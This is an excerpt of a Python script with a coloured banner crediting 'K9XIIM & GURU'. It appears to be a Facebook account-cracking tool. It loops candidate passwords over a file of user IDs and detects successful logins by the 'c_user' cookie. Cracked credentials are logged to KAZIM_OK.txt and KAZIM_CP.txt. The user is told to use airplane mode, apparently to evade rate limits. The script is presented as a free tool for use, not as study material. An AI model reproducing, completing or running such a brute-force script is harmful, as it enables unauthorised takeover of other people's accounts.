...
\033[1;35mâœ…____________________ðŸ’Ÿ________________________âœ…
  ...
  Auther   : \033[1;31mK9XIIM \033[1;37m& \033[1;33mGURU
  \033[1;37mTEAM     : \033[1;34m5H4FQU \033[1;37m& \033[1;31mN4533R \033[1;37m& \033[1;33m4L1Y4N \033[1;37m& \033[1;35mJ4H4Z418
  \033[1;36mYoutube  : KAZIM TRICKER
  \033[1;37mNote     : FREE TRAILER
  \033[1;35mGroup Fb : Facebook Zone ðŸ˜ŠðŸ™ˆ
...
class __xxx__:
    ...
    def chand(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('\033[1;37mENTER FILE PATH: ')
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[KAZIM] {loop}|{len(self.id)} \033[1;32m[OK][{len(ok)}] \033[1;31m[cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [KAZIM-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('KAZIM_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [KAZIM-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('KAZIM_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUSE FLIGHT (\033[1;37mAIRPLANE) \033[1;31mMODE BEFORE\033[1;32m")
            print(47*"-")
            print('\033[1;32m TOTAL AUTO FILE IDS: %s ' % len(self.id))
            print('\033[1;32m CRACK STARTED BE PATIENT')
            print(47*"-")
